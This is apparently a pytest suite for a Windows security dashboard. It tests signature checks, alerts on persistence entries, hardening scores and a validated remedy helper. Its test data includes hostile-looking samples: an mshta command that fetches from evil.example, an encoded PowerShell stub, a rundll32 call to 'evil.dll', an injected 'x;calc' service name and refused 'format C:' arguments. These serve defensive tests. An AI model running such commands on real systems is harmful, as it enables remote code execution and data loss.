"""Page Système : signatures, persistance (référence + alertes), durcissement, remèdes.

Aucun test ne modifie Windows : l'élévation UAC, le registre et les signatures sont simulés.
L'assistant n'est exécuté pour de vrai que sans droits admin, où il doit refuser AVANT d'agir.
"""

import asyncio
import threading
from datetime import datetime, timedelta, timezone

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import select
from sqlalchemy.ext.asyncio import async_sessionmaker, create_async_engine

from app.db import Base
from app.deps import get_current_user
from app.main import app
from app.models.alert import Alert
from app.models.user import Role, User
from app.services import authenticode, hardening, persistence, remedies
from app.services import remedy_helper as helper
from app.services.authenticode import Signature
from app.services.elevation import ActionError


# ─────────────────────────────── signatures
@pytest.mark.parametrize(
    ("code", "publisher", "verdict"),
    [
        (0, "Microsoft Windows", "microsoft"),
        (0, "Microsoft Corporation", "microsoft"),
        (0, "Python Software Foundation", "signed"),
        (0x800B0101, "Old Vendor", "signed"),  # expiré sans horodatage : éditeur identifiable
        (0x800B0100, None, "unsigned"),
        (0x80096010, "Tampered", "invalid"),  # fichier modifié après signature
        (0x800B010C, "Revoked", "invalid"),
        (0x12345678, None, "unknown"),
        (None, None, "unknown"),
    ],
)
def test_signature_classification(code, publisher, verdict):
    assert authenticode.classify(code, publisher).verdict == verdict


def test_publisher_lookalike_is_not_microsoft():
    assert authenticode.classify(0, "Microsoft Windows Fake Ltd").verdict == "signed"


def test_store_package_publisher():
    xml = '<Package><Identity Name="x" Publisher="CN=Microsoft Corporation, O=Microsoft Corporation, C=US" Version="1"/></Package>'
    assert authenticode.publisher_from_manifest(xml) == "Microsoft Corporation"
    store = '<Identity Publisher="CN=24803D75-212C-471A-BC57-9EF86AB91435"/><Properties><PublisherDisplayName>WhatsApp Inc.</PublisherDisplayName></Properties>'
    assert authenticode.publisher_from_manifest(store) == "WhatsApp Inc."
    assert authenticode.publisher_from_manifest("<Package/>") is None


def test_missing_file_is_unknown_not_unsigned(tmp_path):
    assert authenticode.verify(str(tmp_path / "absent.exe")).verdict == "unknown"


# ─────────────────────────────── persistance : commandes (pur)
@pytest.mark.parametrize(
    ("command", "image", "args"),
    [
        ('"C:\\Program Files\\App\\app.exe" --tray', "C:\\Program Files\\App\\app.exe", "--tray"),
        ("C:\\Program Files\\App\\app.exe /s", "C:\\Program Files\\App\\app.exe", "/s"),
        ("rundll32.exe C:\\x\\evil.dll,Start", "rundll32.exe", "C:\\x\\evil.dll,Start"),
        ("\\SystemRoot\\System32\\drivers\\tcpip.sys", "C:\\Windows\\System32\\drivers\\tcpip.sys", ""),
        ("System32\\drivers\\x.sys", "C:\\Windows\\System32\\drivers\\x.sys", ""),
        ("\\??\\C:\\Drivers\\y.sys", "C:\\Drivers\\y.sys", ""),
        ("", None, ""),
    ],
)
def test_split_command(command, image, args, monkeypatch):
    monkeypatch.setattr(persistence, "_SYSTEM_ROOT", "C:\\Windows")
    assert persistence.split_command(command) == (image, args)


def test_environment_variables_are_expanded(monkeypatch):
    monkeypatch.setenv("ProgramFiles", "C:\\Program Files")
    assert persistence.expand("%ProgramFiles%\\X\\x.exe") == "C:\\Program Files\\X\\x.exe"


@pytest.mark.parametrize(
    ("image", "args", "target"),
    [
        ("C:\\Windows\\System32\\rundll32.exe", "C:\\Users\\a\\AppData\\x.dll,Run", "C:\\Users\\a\\AppData\\x.dll"),
        ("C:\\Windows\\System32\\regsvr32.exe", "/s /i C:\\t\\y.dll", "C:\\t\\y.dll"),
        ("C:\\Windows\\System32\\wscript.exe", '"C:\\Users\\a\\s.vbs" //B', "C:\\Users\\a\\s.vbs"),
        ("C:\\Windows\\System32\\mshta.exe", "https://evil.example/a.hta", None),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "-NoP -File C:\\s\\run.ps1", "C:\\s\\run.ps1"),
        ("C:\\Windows\\System32\\cmd.exe", "/c C:\\s\\start.bat", "C:\\s\\start.bat"),
        ("C:\\App\\app.exe", "--x", None),
    ],
)
def test_payload_is_the_hosted_file(image, args, target):
    assert persistence.payload(image, args) == target


@pytest.mark.parametrize(("blob", "enabled"), [(None, True), (b"", True), (bytes([2]) + bytes(11), True), (bytes([6]) + bytes(11), True), (bytes([3]) + bytes(11), False), (bytes([7]) + bytes(11), False)])
def test_startup_approved_state(blob, enabled):
    assert persistence.startup_approved_enabled(blob) is enabled


def test_approved_blob_roundtrip():
    assert persistence.startup_approved_enabled(helper.approved_blob(False, now=1_700_000_000)) is False
    assert persistence.startup_approved_enabled(helper.approved_blob(True)) is True
    assert len(helper.approved_blob(False)) == 12


def _entry(name="Updater", command='"C:\\Users\\a\\AppData\\Local\\u.exe" /bg', mechanism="run", **kw):
    e = persistence.Entry(mechanism, name, "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", command, "user", **kw)
    return persistence.finish(e)


@pytest.mark.parametrize(
    ("command", "verdict", "level"),
    [
        ('"C:\\Users\\a\\AppData\\Local\\u.exe"', "unsigned", "high"),
        ('"C:\\Program Files\\V\\v.exe"', "unsigned", "medium"),
        ('"C:\\Program Files\\V\\v.exe"', "unknown", "medium"),
        ('"C:\\Program Files\\V\\v.exe"', "signed", "low"),
        ('powershell.exe -nop -enc SQBFAFgA', "microsoft", "high"),  # commande encodée : implant typique
        ('mshta.exe https://evil.example/x.hta', "microsoft", "high"),
    ],
)
def test_severity(command, verdict, level):
    assert persistence.severity(_entry(command=command), verdict)[0] == level


def test_ids_are_stable_and_fingerprint_tracks_the_command():
    a, b = _entry(), _entry()
    assert a.id == b.id and len(a.id) == 16
    assert _entry(command='"C:\\x.exe"').fingerprint != a.fingerprint
    assert _entry(name="Other").id != a.id


# ─────────────────────────────── persistance : référence et alertes (base en mémoire)
@pytest.fixture
def db(monkeypatch):
    engine = create_async_engine("sqlite+aiosqlite:///:memory:")
    maker = async_sessionmaker(engine, expire_on_commit=False)

    async def init():
        async with engine.begin() as conn:
            await conn.run_sync(Base.metadata.create_all)

    asyncio.run(init())
    monkeypatch.setattr(persistence, "SessionLocal", maker)
    monkeypatch.setattr(persistence.notify, "enabled", lambda: False)
    yield maker
    asyncio.run(engine.dispose())


def _alerts(maker) -> list[Alert]:
    async def q():
        async with maker() as s:
            return list((await s.scalars(select(Alert))).all())

    return asyncio.run(q())


def test_first_scan_is_the_baseline_then_new_entries_alert(db, monkeypatch):
    monkeypatch.setattr(authenticode, "verify", lambda path: Signature("unsigned"))
    known = _entry(name="Known", command='"C:\\Program Files\\K\\k.exe"')
    rows, created = asyncio.run(persistence.reconcile([known]))
    assert created == [] and rows[known.id].status == "baseline"

    implant = _entry(name="Implant")
    rows, created = asyncio.run(persistence.reconcile([known, implant], now=datetime.now(timezone.utc) + timedelta(minutes=5)))
    assert rows[implant.id].status == "new"
    assert [c["rule_id"] for c in created] == ["persistence-new"]
    alert = _alerts(db)[0]
    assert alert.severity == "high" and alert.mitre == "T1547.001"
    assert "Implant" in alert.message and "u.exe" in alert.message and "NON signé" in alert.message  # traçable

    rows, created = asyncio.run(persistence.reconcile([known, implant]))
    assert created == []  # rien de nouveau : pas de doublon


def test_modified_command_is_flagged(db, monkeypatch):
    monkeypatch.setattr(authenticode, "verify", lambda path: Signature("signed", "Vendor"))
    entry = _entry(name="Tool", command='"C:\\Program Files\\T\\t.exe"')
    asyncio.run(persistence.reconcile([entry]))
    hijacked = _entry(name="Tool", command='"C:\\Users\\a\\AppData\\t.exe"')
    rows, created = asyncio.run(persistence.reconcile([hijacked]))
    assert rows[entry.id].status == "modified"
    assert created and created[0]["rule_title"].startswith("Persistance modifiée")


def test_new_microsoft_signed_entry_does_not_alert(db, monkeypatch):
    monkeypatch.setattr(authenticode, "verify", lambda path: Signature("microsoft", "Microsoft Windows"))
    asyncio.run(persistence.reconcile([_entry(name="A")]))
    rows, created = asyncio.run(persistence.reconcile([_entry(name="A"), _entry(name="WindowsUpdateTask")]))
    assert created == [] and rows[_entry(name="WindowsUpdateTask").id].status == "new"


def test_intermittent_entries_are_not_new_when_they_come_back(db, monkeypatch):
    monkeypatch.setattr(authenticode, "verify", lambda path: Signature("unsigned"))
    driver = _entry(name="usbdrv", mechanism="driver")
    asyncio.run(persistence.reconcile([driver]))
    # Absente d'un balayage (périphérique débranché, mécanisme illisible) : elle n'est pas oubliée...
    rows, _ = asyncio.run(persistence.reconcile([]))
    assert driver.id in rows
    # ... donc son retour ne déclenche pas de fausse alerte.
    _, created = asyncio.run(persistence.reconcile([driver]))
    assert created == []
    # En revanche, revenir avec une AUTRE commande reste une modification détectée.
    _, created = asyncio.run(persistence.reconcile([_entry(name="usbdrv", mechanism="driver", command='"C:\\Users\\a\\AppData\\x.sys"')]))
    assert len(created) == 1


def test_approve_and_reset_baseline(db, monkeypatch):
    monkeypatch.setattr(authenticode, "verify", lambda path: Signature("unsigned"))
    asyncio.run(persistence.reconcile([_entry(name="A")]))
    new = _entry(name="B")
    asyncio.run(persistence.reconcile([_entry(name="A"), new]))
    assert asyncio.run(persistence.approve(new.id)) is True
    rows, _ = asyncio.run(persistence.reconcile([_entry(name="A"), new]))
    assert rows[new.id].status == "baseline"
    assert asyncio.run(persistence.approve("0" * 16)) is False
    asyncio.run(persistence.reset_baseline())
    rows, created = asyncio.run(persistence.reconcile([_entry(name="C")]))
    assert created == [] and rows[_entry(name="C").id].status == "baseline"


# ─────────────────────────────── durcissement (évaluation pure)
GOOD = {
    "edition": "Professional",
    "reg": {"RunAsPPL": 2, "EnableLUA": 1, "ConsentPromptBehaviorAdmin": 5, "PromptOnSecureDesktop": 1, "fDenyTSConnections": 1, "EnableMulticast": 0, "EnableScriptBlockLogging": 1},
    "secure_boot": 1,
    "bitlocker": 1,
    "device_guard": {"vbs": 2, "running": [1, 2]},
    "smb1_installed": False,
    "sysmon": True,
    "accounts": [{"name": "Administrator", "rid": 500, "disabled": True}, {"name": "Guest", "rid": 501, "disabled": True}, {"name": "alice", "rid": 1001, "disabled": False}],
    "admins": ["PC\\Administrator", "PC\\admin-alice"],
    "current_user": "alice",
    "antivirus": [{"name": "Windows Defender", "active": True, "up_to_date": True}],
    "firewall": {"domain": True, "private": True, "public": True},
    "updates": {"pending": 0, "security": 0},
}


def _by_id(facts) -> dict:
    return {c.id: c for c in hardening.evaluate(facts)}


def test_well_hardened_machine_has_no_weakness():
    controls = hardening.evaluate(GOOD)
    assert [c.id for c in controls if c.state == "weak"] == []
    assert hardening.summarize(controls)["grade"] == "A"


def test_weak_machine_offers_remedies():
    facts = {
        **GOOD,
        "reg": {"EnableLUA": 1, "ConsentPromptBehaviorAdmin": 0, "fDenyTSConnections": 0, "UserAuthentication": 0, "UseLogonCredential": 1, "SMB1": 1},
        "smb1_installed": True,
        "accounts": [{"name": "Invité", "rid": 501, "disabled": False, "no_password_required": True}, {"name": "alice", "rid": 1001, "disabled": False}],
        "admins": ["PC\\alice"],
        "antivirus": [{"name": "Windows Defender", "active": True, "up_to_date": False}],
        "firewall": {"domain": True, "private": True, "public": False},
    }
    c = _by_id(facts)
    expected = {"lsa-ppl": "lsa-ppl", "wdigest": "wdigest", "uac": "uac-prompt", "smb1": "smb1", "rdp": "rdp-nla", "llmnr": "llmnr", "ps-scriptblock": "ps-scriptblock", "guest": "guest-off", "antivirus": "defender-update", "firewall": "firewall-on"}
    for cid, remedy in expected.items():
        assert c[cid].state == "weak" and c[cid].remedy == remedy, cid
    assert c["rdp"].level == "high"  # ouvert ET sans NLA
    # Compte quotidien admin : pas de bouton (risque de s'enfermer dehors), un lien.
    assert c["daily-admin"].state == "weak" and c["daily-admin"].remedy is None and c["daily-admin"].link
    assert c["no-password"].state == "weak"
    assert all(r in remedies.CATALOG for r in expected.values())


def test_policy_overrides_rdp_setting_and_uac_disabled_needs_reboot():
    c = _by_id({**GOOD, "reg": {**GOOD["reg"], "fDenyTSConnections": 0, "fDenyTSConnectionsPolicy": 1, "EnableLUA": 0}})
    assert c["rdp"].state == "ok"
    assert c["uac"].remedy == "uac-on" and c["uac"].reboot and c["uac"].level == "high"


def test_home_edition_and_unknown_sources():
    c = _by_id({**GOOD, "edition": "CoreSingleLanguage", "device_guard": None, "antivirus": None, "firewall": None, "updates": None, "accounts": None, "secure_boot": None})
    assert c["credential-guard"].state == "na"
    assert c["secure-boot"].state == "unknown"
    for cid in ("antivirus", "firewall", "updates", "accounts"):
        assert c[cid].state == "unknown"
    s = hardening.summarize(list(c.values()))
    assert s["total"] == sum(1 for x in c.values() if x.state in ("ok", "weak"))


def test_stale_third_party_antivirus_links_instead_of_defender_update():
    c = _by_id({**GOOD, "antivirus": [{"name": "Avast Antivirus", "active": True, "up_to_date": False}]})
    assert c["antivirus"].state == "weak" and c["antivirus"].remedy is None and c["antivirus"].link


# ─────────────────────────────── assistant de remèdes : validation (défense en profondeur)
def test_previous_values_are_whitelisted():
    fix = helper.REG_FIXES["uac-prompt"]
    assert helper.parse_previous(fix, "0,absent") == [0, None]
    assert helper.format_previous([0, None]) == "0,absent"
    for bad in ("7,1", "0", "0,1,1", "x,1", "-1,1"):
        with pytest.raises(helper.Refused):
            helper.parse_previous(fix, bad)


@pytest.mark.parametrize("path", ["\\Microsoft\\Windows\\Defrag\\ScheduledDefrag", "\\microsoft\\x", "\\a\\..\\Microsoft\\x", "noslash", '\\a"b', ""])
def test_windows_tasks_and_malformed_paths_are_refused(path):
    with pytest.raises(helper.Refused):
        helper.check_task_path(path)


@pytest.mark.parametrize("name", ["WinDefend", "EventLog", "mpssvc", "Sysmon64", "bad name", "x;calc", "a/b", ""])
def test_critical_or_malformed_services_are_refused(name):
    with pytest.raises(helper.Refused):
        helper.check_service_name(name)


@pytest.mark.parametrize(
    "argv",
    [
        ["reg", "--fix", "unknown"],
        ["reg", "--fix", "lsa-ppl", "--previous", "5"],
        ["account", "--fix", "delete-everyone"],
        ["firewall", "--profiles", "all"],
        ["startup", "--approved", "RunOnce", "--name", "x", "--state", "off"],
        ["startup", "--approved", "Run", "--name", "..\\x", "--state", "off"],
        ["task", "--path", "\\Microsoft\\Windows\\X", "--state", "off"],
        ["service", "--name", "WinDefend", "--state", "off"],
        ["service", "--name", "X", "--state", "off", "--start", "4"],
        ["format", "C:"],
    ],
)
def test_helper_refuses_before_anything_else(argv):
    assert helper.main(argv) == helper.EXIT_ARGS


@pytest.mark.skipif(helper.is_admin(), reason="exécuté élevé : le test modifierait le poste")
def test_helper_refuses_without_admin_before_touching_windows():
    assert helper.main(["reg", "--fix", "llmnr"]) == helper.EXIT_NOT_ADMIN


# ─────────────────────────────── remèdes : élévation simulée
@pytest.fixture
def fake_registry(monkeypatch, tmp_path):
    """Registre simulé : l'assistant « élevé » écrit dans un dictionnaire."""
    reg: dict[str, int | None] = {}
    calls: list[list[str]] = []

    def run(args):
        calls.append(args)
        if args[0] == "reg":
            fix = helper.REG_FIXES[args[args.index("--fix") + 1]]
            values = helper.parse_previous(fix, args[args.index("--previous") + 1]) if "--previous" in args else [w.target for w in fix.writes]
            for w, v in zip(fix.writes, values):
                reg[w.value] = v
        return helper.EXIT_OK

    monkeypatch.setattr(remedies, "_run_elevated", run)
    monkeypatch.setattr(remedies, "_read_reg", lambda fix_id: [reg.get(w.value) for w in helper.REG_FIXES[fix_id].writes])
    monkeypatch.setattr(remedies, "JOURNAL", tmp_path / "remedies.json")
    monkeypatch.setattr(remedies.sys, "platform", "win32")
    return reg, calls


def test_apply_verifies_journals_and_reverts(fake_registry):
    reg, calls = fake_registry
    result = remedies.apply("lsa-ppl", "admin@test.local")
    assert reg["RunAsPPL"] == 2 and result["record"]["previous"] == [None] and result["record"]["revertible"]
    assert "Redémarrez" in result["detail"]
    assert remedies.apply("lsa-ppl", "admin@test.local")["already"] is True  # idempotent, pas de nouvelle invite
    assert len(calls) == 1

    remedies.revert(result["record"]["id"], "admin@test.local")
    assert reg["RunAsPPL"] is None
    assert remedies.history()[0]["reverted_at"]
    with pytest.raises(ActionError) as exc:
        remedies.revert(result["record"]["id"], "admin@test.local")  # déjà annulé
    assert exc.value.status == 409


def test_unverified_fix_is_an_error(fake_registry, monkeypatch):
    monkeypatch.setattr(remedies, "_run_elevated", lambda args: helper.EXIT_OK)  # « succès » sans effet
    with pytest.raises(ActionError) as exc:
        remedies.apply("llmnr", "admin@test.local")
    assert exc.value.status == 502
    assert remedies.history() == []


@pytest.mark.parametrize(("code", "status"), [(helper.EXIT_ARGS, 400), (helper.EXIT_SYSTEM, 502), (helper.EXIT_NOT_ADMIN, 403), (99, 500)])
def test_helper_exit_codes_map_to_http(fake_registry, monkeypatch, code, status):
    monkeypatch.setattr(remedies, "_run_elevated", lambda args: code)
    with pytest.raises(ActionError) as exc:
        remedies.apply("wdigest", "admin@test.local")
    assert exc.value.status == status


def test_uac_refusal_changes_nothing(fake_registry, monkeypatch):
    def refused(args):
        raise ActionError(403, "Autorisation refusée dans l'invite Windows : rien n'a été modifié.")

    monkeypatch.setattr(remedies, "_run_elevated", refused)
    with pytest.raises(ActionError) as exc:
        remedies.apply("ps-scriptblock", "admin@test.local")
    assert exc.value.status == 403 and remedies.history() == []


def test_one_remedy_at_a_time(fake_registry, monkeypatch):
    started, release = threading.Event(), threading.Event()

    def slow(args):
        started.set()
        release.wait(5)
        return helper.EXIT_OK

    monkeypatch.setattr(remedies, "_run_elevated", slow)
    t = threading.Thread(target=lambda: pytest.raises(ActionError, remedies.apply, "llmnr", "a"))
    t.start()
    started.wait(5)
    with pytest.raises(ActionError) as exc:
        remedies.apply("wdigest", "b")
    release.set()
    t.join(5)
    assert exc.value.status == 409


def test_unknown_fix_is_404(fake_registry):
    with pytest.raises(ActionError) as exc:
        remedies.apply("rm-rf", "a")
    assert exc.value.status == 404


# ─────────────────────────────── remèdes de persistance
@pytest.fixture
def inventory(monkeypatch, tmp_path):
    entries: dict[str, persistence.Entry] = {}
    monkeypatch.setattr(persistence, "current", lambda i: entries.get(i))
    monkeypatch.setattr(persistence, "invalidate", lambda: None)
    monkeypatch.setattr(remedies, "JOURNAL", tmp_path / "remedies.json")
    monkeypatch.setattr(authenticode, "verify", lambda path: Signature("signed", "Vendor"))
    return entries


def test_user_startup_entry_is_disabled_without_uac_and_reverted(inventory, monkeypatch):
    state = {"enabled": True}
    e = _entry(name="Updater", control={"kind": "startup", "hive": "HKCU", "approved": "Run", "name": "Updater"})
    inventory[e.id] = e
    monkeypatch.setattr(remedies, "_startup_enabled", lambda control: state["enabled"])
    monkeypatch.setattr(remedies, "_set_user_startup", lambda control, enabled: state.update(enabled=enabled))
    monkeypatch.setattr(remedies, "_run_elevated", lambda args: pytest.fail("pas d'élévation pour HKCU"))

    result = remedies.set_persistence(e.id, False, "admin@test.local")
    assert state["enabled"] is False and result["record"]["previous"] is True
    remedies.revert(result["record"]["id"], "admin@test.local")
    assert state["enabled"] is True


def test_machine_task_goes_through_the_helper(inventory, monkeypatch):
    state = {"enabled": True}
    e = persistence.Entry("task", "Updater", "\\Vendor", '"C:\\Program Files\\V\\u.exe"', "system", control={"kind": "task", "path": "\\Vendor\\Updater"})
    inventory[e.id] = e
    calls = []
    monkeypatch.setattr(remedies, "_task_enabled", lambda path: state["enabled"])

    def run(args):
        calls.append(args)
        state["enabled"] = args[-1] == "on"
        return helper.EXIT_OK

    monkeypatch.setattr(remedies, "_run_elevated", run)
    remedies.set_persistence(e.id, False, "a")
    assert calls == [["task", "--path", "\\Vendor\\Updater", "--state", "off"]]


@pytest.mark.parametrize(
    ("entry", "sig", "status"),
    [
        (persistence.Entry("task", "Defrag", "\\Microsoft\\Windows", "x", "system", builtin=True, control={"kind": "task", "path": "\\Microsoft\\Windows\\Defrag"}), "signed", 403),
        (persistence.Entry("service", "svc", "HKLM", "x", "system", control={"kind": "service", "name": "svc", "start": 2}), "microsoft", 403),
        (persistence.Entry("service", "WinDefend", "HKLM", "x", "system", control={"kind": "service", "name": "WinDefend", "start": 2}), "signed", 403),
        (persistence.Entry("driver", "evil", "HKLM", "x", "kernel"), "unsigned", 400),
    ],
)
def test_persistence_guards(inventory, monkeypatch, entry, sig, status):
    inventory[entry.id] = entry
    monkeypatch.setattr(authenticode, "verify", lambda path: Signature(sig))
    monkeypatch.setattr(remedies, "_run_elevated", lambda args: pytest.fail("ne doit jamais atteindre l'élévation"))
    with pytest.raises(ActionError) as exc:
        remedies.set_persistence(entry.id, False, "a")
    assert exc.value.status == status


def test_unknown_entry_id_is_refused(inventory):
    with pytest.raises(ActionError) as exc:
        remedies.set_persistence("f" * 16, False, "a")
    assert exc.value.status == 404


# ─────────────────────────────── API : droits, validation
def _client(role: Role) -> TestClient:
    user = User(email=f"{role.value}@test.local", role=role, hashed_password="x")
    app.dependency_overrides[get_current_user] = lambda: user
    return TestClient(app)


@pytest.fixture(autouse=True)
def _clear_overrides():
    yield
    app.dependency_overrides.clear()


def test_only_admins_can_apply_remedies(fake_registry):
    for role in (Role.analyst, Role.viewer):
        c = _client(role)
        assert c.post("/metrics/remedies/llmnr").status_code == 403
        assert c.post("/metrics/remedies/history/abcdef123456/revert").status_code == 403
        assert c.post(f"/metrics/persistence/{'a' * 16}/state", json={"enabled": False}).status_code == 403
        assert c.post("/metrics/persistence/baseline").status_code == 403


def test_remedy_api_validation_and_audit(fake_registry, caplog):
    c = _client(Role.admin)
    assert c.post("/metrics/remedies/..%2Fx").status_code in (404, 422)
    assert c.post("/metrics/remedies/UPPER").status_code == 422
    assert c.post("/metrics/remedies/rm-rf").status_code == 404
    assert c.post("/metrics/persistence/not-an-id/state", json={"enabled": False}).status_code == 422
    assert c.post(f"/metrics/persistence/{'a' * 16}/state", json={"enabled": "maybe"}).status_code == 422
    with caplog.at_level("INFO", logger="detectx.audit"):
        res = c.post("/metrics/remedies/llmnr")
    assert res.status_code == 200 and res.json()["record"]["fix"] == "llmnr"
    assert any("remedy_apply actor=admin@test.local fix=llmnr" in r.message for r in caplog.records)
    history = c.get("/metrics/remedies").json()["history"]
    assert history[0]["fix"] == "llmnr"
